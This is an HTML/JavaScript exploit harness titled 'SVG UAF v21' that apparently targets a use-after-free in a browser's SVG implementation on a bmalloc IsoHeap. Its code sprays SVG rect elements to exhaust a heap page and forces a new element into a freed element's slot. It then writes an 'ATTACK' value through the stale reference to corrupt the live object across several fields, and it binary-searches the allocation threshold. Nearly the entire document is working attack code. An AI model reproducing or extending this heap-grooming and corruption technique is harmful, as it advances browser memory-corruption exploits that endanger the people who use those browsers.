<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>SVG UAF v21</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
h2{color:#ff4141;font-size:11px;letter-spacing:2px;text-transform:uppercase}
.sub{color:#555;font-size:10px;margin-bottom:8px}
#controls{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:8px}
button{background:#111;border:1px solid #333;color:#00ff41;padding:5px 12px;cursor:pointer;font-family:monospace;font-size:10px}
button:hover:not(:disabled){border-color:#00ff41}
button:disabled{opacity:.3}
#log{font-size:10px;line-height:1.6;white-space:pre-wrap;word-break:break-all;margin-top:6px}
.ok{color:#00ff41}.bad{color:#ff4141}.inf{color:#ffcc00}.dim{color:#444}.sep{color:#222}
#stage{position:fixed;top:10px;right:10px;width:200px;height:200px;background:#111;border:1px solid #222;z-index:9999;overflow:hidden}
</style>
</head>
<body>
<h2>SVG UAF v21 - IsoHeap page exhaustion + forced slot reuse</h2>
<div class="sub">v20: CNF 100/100, RUS -1 (IsoPage too large). v21: pre-exhaust page, force B into A freed slot.</div>
<div id="stage"><svg id="livesvg" width="200" height="200" viewBox="0 0 100 100"></svg></div>
<div id="controls">
  <button onclick="runEXH()">EXH exhaust-page</button>
  <button onclick="runRUS()">RUS force-reuse</button>
  <button onclick="runCOR()">COR live-corrupt</button>
  <button onclick="runSCN()">SCN scan-threshold</button>
  <button onclick="runAll()">RUN ALL</button>
  <button onclick="copyLog()">COPY</button>
  <button onclick="clearLog()">CLR</button>
</div>
<div id="log"></div>
<script>
var SVG_NS = 'http://www.w3.org/2000/svg';
var Lel = document.getElementById('log');
var livesvg = document.getElementById('livesvg');

function log(m, c) {
  var s = document.createElement('span');
  if (c) s.className = c;
  s.textContent = m + '\n';
  Lel.appendChild(s);
  Lel.scrollTop = Lel.scrollHeight;
}
function sep() { log('----------------------------------------------------', 'sep'); }
function raf() { return new Promise(function(r){ requestAnimationFrame(r); }); }
function tick() { return new Promise(function(r){ setTimeout(r, 0); }); }
function micro() { return new Promise(function(r){ queueMicrotask(r); }); }

function copyLog() {
  try { navigator.clipboard.writeText(Lel.innerText); } catch(e) {
    var a = document.createElement('textarea');
    a.value = Lel.innerText;
    document.body.appendChild(a);
    a.select();
    document.execCommand('copy');
    a.remove();
  }
}
function clearLog() { Lel.innerHTML = ''; }
function dis(d) {
  var btns = document.querySelectorAll('button');
  for (var i = 0; i < btns.length; i++) {
    var fn = btns[i].getAttribute('onclick') || '';
    if (fn.indexOf('copy') === -1 && fn.indexOf('clear') === -1) btns[i].disabled = d;
  }
}
window.onerror = function(m, u, l, c) { log('[CRASH] ' + m + ' L' + l + ':' + c, 'bad'); return false; };

function mkRect(w, h, x, y) {
  w = w || 80; h = h || 80; x = x || 5; y = y || 5;
  var r = document.createElementNS(SVG_NS, 'rect');
  r.setAttribute('x', '' + x);
  r.setAttribute('y', '' + y);
  r.setAttribute('width', '' + w);
  r.setAttribute('height', '' + h);
  r.setAttribute('fill', 'none');
  return r;
}

function flush() {
  while (livesvg.firstChild) livesvg.removeChild(livesvg.firstChild);
}

/*
 * WHY v20 RUS FAILED:
 *   bmalloc IsoPage holds more than 256 SVGRectElements.
 *   New allocs use bump pointer on the CURRENT page.
 *   Freed slot goes into the free list of its page.
 *   Free list is only consulted when the current page's bump is exhausted.
 *   Solution: exhaust the current page BEFORE creating A.
 *   Then A goes onto a fresh page. Free A -> top of free list on fresh page.
 *   Next alloc on that page hits free list -> B lands in A's slot.
 *
 * STRATEGY v21:
 *   Step 1 (EXH): alloc many rects with no free -> burn through current IsoPage bump
 *   Step 2 (RUS): NOW alloc A -> goes to new page. Free A. Alloc B -> hits free list = A's slot.
 *   Step 3 (COR): confirm animLen_A reads B's values. Write via animLen_A. B shows corrupted value.
 *
 * HOW MANY TO EXHAUST?
 *   SVGRectElement size ~ 256-512 bytes (arm64 with vtable, Node fields, SVG attrs)
 *   IsoPage size = 16384 bytes (16KB, standard bmalloc)
 *   Objects per page = 16384 / size
 *   If size=256 -> 64 per page
 *   If size=512 -> 32 per page
 *   If size=128 -> 128 per page
 *   We don't know exact size. So: scan from 32 to 2048 in doubling steps.
 *   EXH test: exhaust with N rects, then do A/free/B, check if reuse happens.
 *   First N where reuse happens = page size in objects.
 */

// EXH: find the IsoPage exhaustion threshold
async function runEXH(q) {
  if (!q) { dis(true); sep(); log('EXH: find IsoPage exhaustion threshold', 'inf'); sep(); }
  log('[*] exhaust with N rects (no free), then alloc A, free A, alloc B', 'ok');
  log('[*] if animLen_A reads B_width after exhaust -> page was full, B hit free list', 'ok');
  log('');

  var found_threshold = -1;
  var exhaust_counts = [32, 64, 96, 128, 192, 256, 384, 512, 768, 1024, 1536, 2048];

  for (var ei = 0; ei < exhaust_counts.length; ei++) {
    var N = exhaust_counts[ei];
    flush(); await raf(); await raf();

    // Exhaust N rects - keep them alive (no free = they stay in bump alloc space)
    var exhaust = [];
    for (var xi = 0; xi < N; xi++) {
      var ex = mkRect(10 + xi % 50);
      livesvg.appendChild(ex);
      exhaust.push(ex);
    }
    await raf();

    // Now alloc A on (hopefully) a fresh page
    var A = mkRect(80);
    livesvg.appendChild(A);
    await raf();

    var bv_A = A.width ? A.width.baseVal : null;
    var A_w = bv_A ? bv_A.value : null;

    // Free A -> should go to top of free list on its page
    A.remove();
    await micro();

    // Alloc B -> if page was exhausted, bmalloc falls back to free list -> B = A's slot
    var B_W = 55;
    var B = mkRect(B_W);
    livesvg.appendChild(B);
    await micro();

    var curr = null;
    try { curr = bv_A ? bv_A.value : null; } catch(e) {}

    var reused = (curr !== null && curr !== A_w && Math.abs(curr - B_W) < 1);

    log('  N=' + N + ': animLen_A reads ' + curr + ' (A_w=' + A_w + ' B_w=' + B_W + ') reused=' + reused, reused ? 'bad' : 'dim');

    if (reused) {
      found_threshold = N;
      log('  [!!] PAGE EXHAUSTED at N=' + N + ': B landed in A freed slot!', 'bad');
      log('  animLen_A reads B_w=' + curr + ' -> m_contextElement now points to B', 'bad');

      // Confirm: write via animLen_A, check B
      try { if (bv_A) bv_A.value = 9999; } catch(e) {}
      var bW = null;
      try { bW = B.width ? B.width.baseVal.value : null; } catch(e) {}
      var bBBox = null;
      try { bBBox = B.getBBox ? B.getBBox().width : null; } catch(e) {}
      log('  write 9999 via animLen_A -> B.width.baseVal=' + bW + ' B.getBBox()=' + bBBox, 'bad');
      if (bW === 9999 || bBBox === 9999) {
        log('  [!!] LIVE CORRUPTION CONFIRMED via exhaust method!', 'bad');
      }
      flush(); await raf();
      break;
    }

    flush(); await raf();
  }

  if (found_threshold === -1) {
    log('  no reuse found up to 2048 exhaust allocs', 'inf');
    log('  [*] IsoPage is very large or exhaust rects are being freed by GC', 'inf');
    log('  [*] try SCN for finer-grained scan', 'inf');
  } else {
    log('  RESULT: threshold=' + found_threshold, 'bad');
  }

  if (!q) dis(false);
  return { found_threshold: found_threshold };
}

// RUS: forced reuse using exhaust + controlled A/B sequence
async function runRUS(q) {
  if (!q) { dis(true); sep(); log('RUS: forced slot reuse via page exhaustion', 'inf'); sep(); }
  log('[*] exhaust 512 rects, alloc A(w=80), free A, alloc B(w=55), check animLen_A', 'ok');
  log('[*] also try: exhaust, free all exhaust, alloc A, free A, alloc B', 'ok');
  log('');

  var reuse_confirmed = false;

  // Method 1: exhaust KEEP ALIVE then alloc A/B
  for (var method = 1; method <= 3; method++) {
    flush(); await raf(); await raf();
    log('  Method ' + method + ':', 'inf');

    var exhaust = [];
    var EXHAUST_N = method === 1 ? 512 : method === 2 ? 1024 : 256;

    // Alloc exhaust rects
    for (var xi = 0; xi < EXHAUST_N; xi++) {
      var ex = mkRect(20);
      livesvg.appendChild(ex);
      exhaust.push(ex);
    }

    if (method === 2) {
      // Method 2: also free the exhaust rects to fill free list, then alloc A
      // A goes to free list head -> B should also get free list head
      for (var fi = exhaust.length - 1; fi >= 0; fi--) {
        exhaust[fi].remove();
      }
      exhaust = [];
      await raf();
    }

    if (method === 3) {
      // Method 3: free exhaust in FORWARD order then alloc A
      for (var fi2 = 0; fi2 < exhaust.length; fi2++) {
        exhaust[fi2].remove();
      }
      exhaust = [];
      await raf();
    }

    await raf();

    // Alloc A
    var A = mkRect(80);
    livesvg.appendChild(A);
    await raf();
    var bv_A = A.width ? A.width.baseVal : null;
    var A_w = bv_A ? bv_A.value : null;

    // Free A
    A.remove();
    await micro();

    var freed_val = null;
    try { freed_val = bv_A ? bv_A.value : null; } catch(e) {}
    log('    after free: animLen_A=' + freed_val + ' (A_w=' + A_w + ')', 'ok');

    // Alloc B with distinct width
    var B_W = 55;
    var B = mkRect(B_W);
    livesvg.appendChild(B);
    await micro();

    var curr = null;
    try { curr = bv_A ? bv_A.value : null; } catch(e) {}
    var reused = curr !== null && curr !== A_w && Math.abs(curr - B_W) < 1;

    log('    B alloc: animLen_A=' + curr + ' (B_w=' + B_W + ') reused=' + reused, reused ? 'bad' : 'dim');

    if (reused) {
      reuse_confirmed = true;
      log('    [!!] SLOT REUSE CONFIRMED method=' + method, 'bad');

      // Write through animLen_A into live B
      try { if (bv_A) bv_A.value = 9999; } catch(e) {}
      var bW = null;
      try { bW = B.width ? B.width.baseVal.value : null; } catch(e) {}
      var bBBox = null;
      try { bBBox = B.getBBox ? B.getBBox().width : null; } catch(e) {}
      log('    write 9999 via animLen_A -> B.width=' + bW + ' bbox=' + bBBox, 'bad');

      if (bW === 9999 || bBBox === 9999) {
        log('    [!!] LIVE OBJECT CORRUPTION VIA UAF!', 'bad');
      }
      flush(); await raf();
      break;
    }

    flush(); await raf();
  }

  log('[*] RUS: reuse_confirmed=' + reuse_confirmed, reuse_confirmed ? 'bad' : 'inf');
  if (!q) dis(false);
  return { reuse_confirmed: reuse_confirmed };
}

// COR: full live corruption demo once we know threshold
async function runCOR(q) {
  if (!q) { dis(true); sep(); log('COR: live corruption - full structured demo', 'inf'); sep(); }
  log('[*] exhaust page, free A, force B into slot, write ATTACK, verify B corrupted', 'ok');
  log('');

  var ATTACK = 31337.0;
  var corruptConfirmed = false;

  // Try multiple exhaust counts
  var counts = [256, 512, 768, 1024, 1536, 2048];

  for (var ci = 0; ci < counts.length; ci++) {
    var N = counts[ci];
    flush(); await raf(); await raf();

    // Exhaust
    var exhaust = [];
    for (var xi = 0; xi < N; xi++) {
      var ex = mkRect(10);
      livesvg.appendChild(ex);
      exhaust.push(ex);
    }
    await raf();

    // Alloc A
    var A = mkRect(80);
    livesvg.appendChild(A);
    await raf();
    var bv_A = A.width ? A.width.baseVal : null;
    var A_w = bv_A ? bv_A.value : null;

    // Free A
    A.remove();
    await micro();

    // Alloc B
    var B = mkRect(55);
    livesvg.appendChild(B);
    await micro();

    var curr = null;
    try { curr = bv_A ? bv_A.value : null; } catch(e) {}
    var reused = curr !== null && curr !== A_w;

    if (!reused) {
      log('  N=' + N + ': no reuse (animLen_A=' + curr + ')', 'dim');
      flush(); await raf();
      continue;
    }

    log('  N=' + N + ': REUSE! animLen_A=' + curr + ' (was ' + A_w + ', B_w=55)', 'bad');

    // Write ATTACK via animLen_A while B is live
    try { if (bv_A) bv_A.value = ATTACK; } catch(e) {}
    await micro();

    // Read B through its own JS interface
    var bW_bv = null;
    try { bW_bv = B.width ? B.width.baseVal.value : null; } catch(e) {}
    var bW_bbox = null;
    try { bW_bbox = B.getBBox ? B.getBBox().width : null; } catch(e) {}
    var bW_anim = null;
    try { bW_anim = B.width ? B.width.animVal.value : null; } catch(e) {}

    log('  B.width.baseVal = ' + bW_bv, bW_bv === ATTACK ? 'bad' : 'ok');
    log('  B.getBBox().w   = ' + bW_bbox, bW_bbox === ATTACK ? 'bad' : 'ok');
    log('  B.width.animVal = ' + bW_anim, bW_anim === ATTACK ? 'bad' : 'ok');

    if (bW_bv === ATTACK || bW_bbox === ATTACK || bW_anim === ATTACK) {
      corruptConfirmed = true;
      log('  [!!] LIVE OBJECT CORRUPTION CONFIRMED at N=' + N, 'bad');
      log('  [!!] B.width=' + bW_bv + ' without B.setAttribute ever being called', 'bad');
      log('  [!!] B is a live DOM element with corrupted C++ attribute storage', 'bad');

      // Also corrupt height, x, y to prove multi-field control
      var bv_H = A.height ? A.height.baseVal : null;
      var bv_X = A.x ? A.x.baseVal : null;
      var bv_Y = A.y ? A.y.baseVal : null;
      try { if (bv_H) bv_H.value = ATTACK + 1; } catch(e) {}
      try { if (bv_X) bv_X.value = ATTACK + 2; } catch(e) {}
      try { if (bv_Y) bv_Y.value = ATTACK + 3; } catch(e) {}

      var bH = null, bX = null, bY = null;
      try { bH = B.height ? B.height.baseVal.value : null; } catch(e) {}
      try { bX = B.x ? B.x.baseVal.value : null; } catch(e) {}
      try { bY = B.y ? B.y.baseVal.value : null; } catch(e) {}
      log('  multi-field: B.height=' + bH + ' B.x=' + bX + ' B.y=' + bY, 'bad');
      log('  expected:    B.height=' + (ATTACK+1) + ' B.x=' + (ATTACK+2) + ' B.y=' + (ATTACK+3), 'inf');
      flush(); await raf();
      break;
    }

    flush(); await raf();
  }

  log('[*] COR: corruptConfirmed=' + corruptConfirmed, corruptConfirmed ? 'bad' : 'inf');
  if (!q) dis(false);
  return { corruptConfirmed: corruptConfirmed };
}

// SCN: fine-grained threshold scan
async function runSCN(q) {
  if (!q) { dis(true); sep(); log('SCN: fine-grained IsoPage size scan', 'inf'); sep(); }
  log('[*] scan exhaust counts 1..2048 in steps to find exact page boundary', 'ok');
  log('[*] binary search: find smallest N where reuse happens', 'ok');
  log('');

  // Binary search between 1 and 4096
  var lo = 1, hi = 4096, threshold = -1;

  while (lo <= hi) {
    var mid = Math.floor((lo + hi) / 2);
    flush(); await raf();

    var exhaust = [];
    for (var xi = 0; xi < mid; xi++) {
      var ex = mkRect(20);
      livesvg.appendChild(ex);
      exhaust.push(ex);
    }
    await raf();

    var A = mkRect(80);
    livesvg.appendChild(A);
    await raf();
    var bv_A = A.width ? A.width.baseVal : null;
    var A_w = bv_A ? bv_A.value : null;

    A.remove();
    await micro();

    var B = mkRect(55);
    livesvg.appendChild(B);
    await micro();

    var curr = null;
    try { curr = bv_A ? bv_A.value : null; } catch(e) {}
    var reused = curr !== null && curr !== A_w && Math.abs(curr - 55) < 1;

    log('  mid=' + mid + ': animLen_A=' + curr + ' reused=' + reused, reused ? 'bad' : 'dim');

    if (reused) {
      threshold = mid;
      hi = mid - 1;
    } else {
      lo = mid + 1;
    }

    flush(); await raf();
  }

  if (threshold !== -1) {
    log('  [!!] EXACT THRESHOLD: ' + threshold + ' exhaust rects needed', 'bad');
    log('  [*] SVGRectElement IsoPage holds ~' + threshold + ' objects', 'bad');
    log('  [*] obj size ~ ' + Math.round(16384 / threshold) + ' bytes (assuming 16KB IsoPage)', 'inf');
  } else {
    log('  threshold > 4096 - IsoPage is unusually large or exhaust being GCd', 'inf');
    log('  [*] check if exhaust rects survive: try forcing layout between allocs', 'inf');
  }

  if (!q) dis(false);
  return { threshold: threshold };
}

// RUN ALL
async function runAll() {
  dis(true); clearLog(); sep();
  log('SVG UAF v21 - IsoHeap page exhaustion + forced slot reuse', 'inf');
  sep();

  var results = {};
  var tests = [
    ['EXH_page_exhaust',   runEXH],
    ['RUS_forced_reuse',   runRUS],
    ['COR_live_corrupt',   runCOR],
    ['SCN_threshold_scan', runSCN]
  ];

  for (var i = 0; i < tests.length; i++) {
    var lbl = tests[i][0];
    var fn  = tests[i][1];
    sep();
    log(lbl, 'inf');
    sep();
    try {
      results[lbl] = await fn(true);
    } catch(e) {
      log('[!] ' + lbl + ': ' + e, 'bad');
      results[lbl] = null;
    }
    log('');
  }

  sep();
  log('SUMMARY v21', 'inf');
  sep();
  var keys = Object.keys(results);
  for (var ki = 0; ki < keys.length; ki++) {
    var k = keys[ki];
    var r = results[k];
    if (!r) { log('  ' + k + ': ERROR', 'bad'); continue; }
    var v = r.found_threshold !== undefined ? r.found_threshold :
            r.reuse_confirmed !== undefined ? r.reuse_confirmed :
            r.corruptConfirmed !== undefined ? r.corruptConfirmed :
            r.threshold !== undefined ? r.threshold : '?';
    var cls = (typeof v === 'number' && v > 0) || v === true ? 'bad' : 'dim';
    log('  ' + k + ': key=' + v, cls);
  }
  sep();
  dis(false);
}
</script>
</body>
</html>
